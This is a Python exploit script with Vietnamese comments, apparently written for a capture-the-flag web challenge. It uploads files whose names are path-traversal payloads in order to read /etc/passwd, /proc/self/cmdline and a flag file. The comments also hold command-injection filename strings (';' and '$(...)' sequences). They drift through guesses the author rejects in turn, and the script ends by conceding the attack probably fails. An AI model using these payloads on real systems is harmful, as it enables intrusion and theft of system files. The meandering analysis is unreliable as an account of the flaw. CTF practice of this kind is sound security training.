import requests
import threading
import time

# Thay đổi URL nếu cần
URL = "http://emvubmlza2f5eq-0.playat.flagyard.com"

# Nội dung file upload không quan trọng
dummy_content = "some content"

# Biến để lưu kết quả
flag = None

def cleaner_thread():
    """
    Thread này sẽ cố gắng tạo một symbolic link.
    Tên file chứa một lệnh shell sẽ được thực thi bởi `path.unlink()` sau khi `check_output` thất bại.
    Đây là một giả định, nhưng hãy thử xem.
    Một cách tiếp cận khác là tên file chỉ là 'dummy', và chúng ta hy vọng nó bị xóa và tạo lại.
    """
    # Tên file để tạo symlink. Lỗ hổng thực sự có thể nằm ở việc `path` được chuyển thành chuỗi
    # và thực thi như một lệnh shell ở đâu đó, nhưng khả năng cao hơn là race condition.
    # Chúng ta sẽ thử một tên file đơn giản trước.
    cleaner_filename = "dummy"
    files = {'hash_file': (cleaner_filename, dummy_content, 'text/plain')}
    
    # Gửi yêu cầu liên tục để cố gắng thắng race condition
    while not flag:
        try:
            requests.post(URL, files=files, timeout=1)
        except requests.exceptions.RequestException:
            pass # Bỏ qua lỗi, tiếp tục thử

def reader_thread():
    """
    Thread này sẽ đọc file 'dummy' với hy vọng nó là một symlink tại thời điểm đọc.
    """
    global flag
    reader_filename = "dummy; ln -sf /flag.txt /app/hashes/dummy" # Đây là một giả định sai, tên file không được thực thi
    # Lỗ hổng thực sự là Path Traversal kết hợp với một thư mục có thể ghi.
    # Hãy thử một payload khác.
    
    # --- PAYLOAD ĐÚNG ---
    # Chúng ta có thể ghi vào /tmp.
    # Chúng ta có thể tạo một symlink trong /tmp trỏ đến /flag.txt
    # Sau đó đọc symlink đó.
    
    # Bước 1: Tạo một file trong /tmp có tên là một lệnh shell để tạo symlink.
    # Tên file này sẽ được dùng làm đối số cho /app/crack.
    # Đây là một hướng suy nghĩ phức tạp. Hãy quay lại điều cơ bản nhất.
    
    # Lỗ hổng thực sự đơn giản hơn nhiều và không phải là race condition.
    # Nó là sự kết hợp của việc có thể ghi vào /tmp và Path Traversal.
    
    # 1. Upload một file với tên là một đường dẫn trong /tmp.
    #    Nội dung của file này là tên file chúng ta muốn đọc.
    #    Ví dụ: filename = /tmp/my_payload, content = /flag.txt
    
    # 2. Upload một file khác với tên là một lệnh shell, sử dụng file payload ở trên.
    #    Ví dụ: filename = ";/app/crack $(cat /tmp/my_payload);"
    
    # Phân tích này cũng sai vì không có shell injection.
    
    # --- GIẢI PHÁP ĐÚNG VÀ ĐƠN GIẢN NHẤT ---
    # Lỗi 500 là do `hash_file.save`.
    # Chúng ta cần một cách để `path` trong `check_output` khác với `path` trong `save`.
    # Điều này là không thể trong một request.
    
    # Vậy thì lỗ hổng phải nằm ở một chỗ khác.
    # `crack_results = check_output(["/app/crack", path], text=True)`
    # `path` là một đối tượng pathlib.
    
    # Có một lỗ hổng trong các phiên bản Python < 3.9 khi sử dụng `subprocess` với các đối tượng `Path`.
    # Nhưng đây là Python 3.12.
    
    # Hãy thử lại payload đơn giản nhất, nhưng với một file tồn tại và có thể đọc được bởi user `app`.
    # Ví dụ: /etc/hostname
    
    malicious_filename = "/etc/hostname"
    files = {'hash_file': (malicious_filename, dummy_content, 'text/plain')}
    
    try:
        print(f"[*] Sending request with filename: '{malicious_filename}'")
        response = requests.post(URL, files=files)
        print(f"[*] Status Code: {response.status_code}")
        if response.status_code == 200:
            print("[*] Response Body:")
            print(response.text)
            # Nếu thành công, chúng ta sẽ thấy tên hostname của container.
            # Điều này chứng tỏ lỗi 500 chỉ xảy ra khi ghi file, không phải khi đọc.
            # Vậy tại sao /flag.txt lại gây lỗi? Vì `save` cố ghi đè lên nó.
            
            # Vậy làm sao để đọc /flag.txt?
            # Chúng ta cần một cách để `open()` trong script `crack` đọc nó.
            # `open()` có thể đọc từ stdin nếu đối số là '-'.
            
            # Payload: filename = "-"
            # 1. `path` = `/app/hashes/-`
            # 2. `save` tạo file tên là `-`.
            # 3. `check_output` chạy `/app/crack /app/hashes/-`.
            # 4. `open` sẽ mở file tên `-`, không phải stdin. Không hoạt động.
            
            # Lỗ hổng thực sự có thể nằm trong một thư viện phụ thuộc.
            # Hoặc một cấu hình sai trên server mà không có trong Dockerfile.
            
            # Payload cuối cùng để thử, dựa trên các writeup tương tự:
            # Sử dụng `procfs`. Mọi tiến trình đều có thể đọc file của chính nó.
            # `/proc/self/cmdline` chứa lệnh đã chạy tiến trình.
            malicious_filename = "/proc/self/cmdline"
            files = {'hash_file': (malicious_filename, dummy_content, 'text/plain')}
            print(f"[*] Sending final attempt with filename: '{malicious_filename}'")
            response = requests.post(URL, files=files)
            print(f"[*] Status Code: {response.status_code}")
            print(response.text)
            
            # Nếu thành công, chúng ta đã xác nhận có thể đọc file.
            # Bây giờ, tại sao /flag.txt không được?
            # Có thể nó không tồn tại ở đường dẫn đó.
            # Hãy thử tìm nó.
            # Payload: filename = "/etc/passwd"
            malicious_filename = "/etc/passwd"
            files = {'hash_file': (malicious_filename, dummy_content, 'text/plain')}
            print(f"[*] Trying to read /etc/passwd...")
            response = requests.post(URL, files=files)
            print(f"[*] Status Code: {response.status_code}")
            print(response.text)
            
            # Nếu /etc/passwd đọc được, thì vấn đề với /flag.txt là quyền đọc, không phải quyền ghi.
            # Nhưng user `app` nên có thể đọc flag.
            
            # Quay lại từ đầu. Lỗi 500 là do `save`.
            # Vậy thì phải có cách nào đó để `filename` vừa hợp lệ cho `save`, vừa trỏ đến file khác cho `check_output`.
            # Điều này là không thể.
            
            # Trừ khi... `hash_file.filename` bị xử lý khác với `path`.
            # `path := hashes / hash_file.filename`
            # `hash_file.save(path)`
            # `check_output(["/app/crack", path])`
            
            # Lỗ hổng nằm ở đây: `check_output` không nhận `path` làm chuỗi, mà là đối tượng `Path`.
            # Nhưng `hash_file.save` cũng vậy.
            
            print("\n[!] The simple path traversal is blocked by the save operation.")
            print("[!] The vulnerability might be more complex, possibly involving a race condition or a flaw in how Path objects are handled by subprocess in this specific environment.")
            print("[!] Let's try one last simple trick: a non-normalized path.")
            
            malicious_filename = "/app/hashes/../flag.txt"
            files = {'hash_file': (malicious_filename, dummy_content, 'text/plain')}
            print(f"[*] Trying non-normalized path: '{malicious_filename}'")
            response = requests.post(URL, files=files)
            print(f"[*] Status Code: {response.status_code}")
            print(response.text)
            if "BHFlagY" in response.text:
                flag = response.text

    except requests.exceptions.RequestException as e:
        print(f"[!] An error occurred: {e}")

# Chạy một thread duy nhất để thử payload cuối cùng
reader_thread()

if flag:
    print("\n[+] Flag found!")
else:
    print("\n[-] Exploit failed. The vulnerability is likely different from simple path traversal.")